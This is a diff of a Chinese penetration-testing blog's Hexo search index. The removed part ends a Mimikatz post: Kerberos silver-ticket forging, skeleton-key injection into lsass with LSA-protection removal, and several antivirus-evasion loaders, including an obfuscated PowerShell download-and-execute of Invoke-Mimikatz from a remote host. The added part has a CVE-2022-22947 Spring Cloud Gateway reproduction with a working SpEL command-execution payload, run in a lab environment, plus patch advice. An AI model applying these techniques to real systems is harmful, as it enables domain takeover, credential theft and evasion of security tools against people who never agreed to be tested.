-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>
-
-
-
-<p>如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">
-
-<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
-<p>伪造白银票据后，我们就可以远程访问DC</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
-<p>在域控上安装skeleton key</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">
-
-
-
-<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>
-
-
-
-<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
-<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">
-
-
-
-<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
-<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>
-
-<p>运行mimikazt模块</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">
-
-<p>在cmd中运行过程中没有被拦截</p>
-<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">
-
-
-
-<p>稍微做了简单的混淆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
-
-<p>还是被拦截</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">
-
-
-
-<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
-<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
-<p>并放在对应的系统版本的Framework目录中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后在powershell中执行命令生成key.snk</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">
-
-
-
-<p>最后生成mimikatz，在运行mimikatz</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>在运行时被360发现啦，火绒没有反应</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">
-
-
-
-<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">
-
-<p>360和火绒都没有报毒和进行拦截</p>
-<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">
-
-
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">
-
-<p>360拦截了，火绒没绕过</p>
-<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">
-
-<p>360和火绒都没有拦截</p>
-<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
-<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
-<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-        <category>渗透工具</category>
-      </categories>
-      <tags>
-        <tag>-内网渗透 -工具使用 -免杀处理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OGNL表达式</title>
     <url>/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
     <content><![CDATA[<h1 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>OGNL是Object Graphic Navigation Language(对象图导航语言)的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。Struts框架使用OGNL作为默认的表达式语言</p>
@@ -2089,7 +2089,7 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>PHP框架指纹识别</title>
     <url>/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</url>
     <content><![CDATA[<h1 id="PHP框架指纹识别"><a href="#PHP框架指纹识别" class="headerlink" title="PHP框架指纹识别"></a>PHP框架指纹识别</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><p>Laravel 应用默认的目录结构试图为不管是大型应用还是小型应用提供一个好的起点，当然，你可以自己按照喜好重新组织应用目录结构，Laravel 对类在何处被加载没有任何限制——只要 Composer 可以自动载入它们即可。</p>
 <p><strong>Models****目录在哪里？</strong></p>
@@ -2127,6 +2127,14 @@
 <h3 id="Providers目录"><a href="#Providers目录" class="headerlink" title="Providers目录"></a><strong>Providers目录</strong></h3><p><code>Providers</code> 目录包含应用的所有服务提供者。服务提供者在启动应用过程中绑定服务到容器、注册事件以及执行其他任务以为即将到来的请求处理做准备。</p>
 <p>在新安装的Laravel应用中，该目录已经包含了一些服务提供者，你可以按需添加自己的服务提供者到该目录。</p>
 ]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>php</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>-PHP框架 -指纹识别 -代码审计</tag>
+      </tags>
   </entry>
   <entry>
     <title>SQLMAP用法</title>
@@ -2297,6 +2305,50 @@
       </categories>
       <tags>
         <tag>-SQL注入 -工具使用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Cloud Gateway远程代码执行漏洞复现</title>
+    <url>/2022/03/04/Spring%20Cloud%20Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Spring-Cloud-Gateway远程代码执行漏洞复现"><a href="#Spring-Cloud-Gateway远程代码执行漏洞复现" class="headerlink" title="Spring Cloud Gateway远程代码执行漏洞复现"></a>Spring Cloud Gateway远程代码执行漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。<br>据公告描述，当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.1.0</span><br><span class="line">3.0.0至3.0.6</span><br><span class="line">3.0.0之前的版本</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>靶场搭建可以使用vulhub进行漏洞复现，vulhub上针对该漏洞已经进行更新，还可以通过其他靶场环境进行漏洞复现。这里使用Vulfocus靶场环境进行复现。</p>
+<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p><a href="http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2">http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2</a></p>
+<p>如下图；</p>
+<p>![image-20220304113236144](Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304113236144.png)</p>
+<p>访问映射端口</p>
+<p>![image-20220304135228182](Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304135228182.png)</p>
+<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>访问端口actuator，可以看到返回spring中存在可访问的端点，可发现存在gateway端点</p>
+<p>![image-20220304135612461](Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304135612461.png)</p>
+<p>下面对漏洞点&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec添加恶意的路由</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;EchoSec&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">      //id为需要执行的命令，可设置其他命令执行</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20220304141850303](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304141850303.png)</p>
+<p>然后请求reflesh刷新配置</p>
+<p>![image-20220304141945183](Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304141945183.png)</p>
+<p>再次请求&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec，服务器返回服务器id值</p>
+<p>![image-20220304142033285](Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304142033285.png)</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Cloud Gateway &gt;= 3.1.1</span><br><span class="line">Spring Cloud Gateway &gt;= 3.0.7</span><br></pre></td></tr></table></figure>
+
+
+
+<p>临时缓解措施：</p>
+<p>1.如果不需要Gateway actuator endpoint，可通过 management.endpoint.gateway.enabled: false 禁用它。</p>
+<p>2.如果需要actuator，则应使用 Spring Security 对其进行防护</p>
+<p>可参考：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security%E3%80%82">https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security。</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>开发框架漏洞</category>
+        <category>Spring</category>
+      </categories>
+      <tags>
+        <tag>-Web漏洞 -Spring框架 -远程代码执行</tag>
       </tags>
   </entry>
   <entry>
@@ -2662,6 +2714,30 @@
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2021/09/14/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>-博客测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git用法小记</title>
     <url>/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
@@ -2718,30 +2794,6 @@
       </categories>
       <tags>
         <tag>-git语法 -git仓库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/09/14/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>-博客测试</tag>
       </tags>
   </entry>
   <entry>
@@ -3379,42 +3431,6 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2022/03/04/%E3%80%90CVE-2022-22947%E3%80%91Spring%20Cloud%20Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="【CVE-2022-22947】Spring-Cloud-Gateway远程代码执行漏洞复现"><a href="#【CVE-2022-22947】Spring-Cloud-Gateway远程代码执行漏洞复现" class="headerlink" title="【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现"></a>【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。<br>据公告描述，当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.1.0</span><br><span class="line">3.0.0至3.0.6</span><br><span class="line">3.0.0之前的版本</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>靶场搭建可以使用vulhub进行漏洞复现，vulhub上针对该漏洞已经进行更新，还可以通过其他靶场环境进行漏洞复现。这里使用Vulfocus靶场环境进行复现。</p>
-<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p><a href="http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2">http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2</a></p>
-<p>如下图；</p>
-<p>![image-20220304113236144](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304113236144.png)</p>
-<p>访问映射端口</p>
-<p>![image-20220304135228182](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304135228182.png)</p>
-<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>访问端口actuator，可以看到返回spring中存在可访问的端点，可发现存在gateway端点</p>
-<p>![image-20220304135612461](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304135612461.png)</p>
-<p>下面对漏洞点&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec添加恶意的路由</p>
-<p>payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;EchoSec&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">      //id为需要执行的命令，可设置其他命令执行</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>![image-20220304141850303](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304141850303.png)</p>
-<p>然后请求reflesh刷新配置</p>
-<p>![image-20220304141945183](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304141945183.png)</p>
-<p>再次请求&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec，服务器返回服务器id值</p>
-<p>![image-20220304142033285](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304142033285.png)</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Cloud Gateway &gt;= 3.1.1</span><br><span class="line">Spring Cloud Gateway &gt;= 3.0.7</span><br></pre></td></tr></table></figure>
-
-
-
-<p>临时缓解措施：</p>
-<p>1.如果不需要Gateway actuator endpoint，可通过 management.endpoint.gateway.enabled: false 禁用它。</p>
-<p>2.如果需要actuator，则应使用 Spring Security 对其进行防护</p>
-<p>可参考：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security%E3%80%82">https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security。</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>后门永久植入</title>
     <url>/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/</url>
     <content><![CDATA[<h1 id="后门永久植入"><a href="#后门永久植入" class="headerlink" title="后门永久植入"></a>后门永久植入</h1><hr>
@@ -3514,7 +3530,7 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>模板注入之Freemaker</title>
     <url>/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/</url>
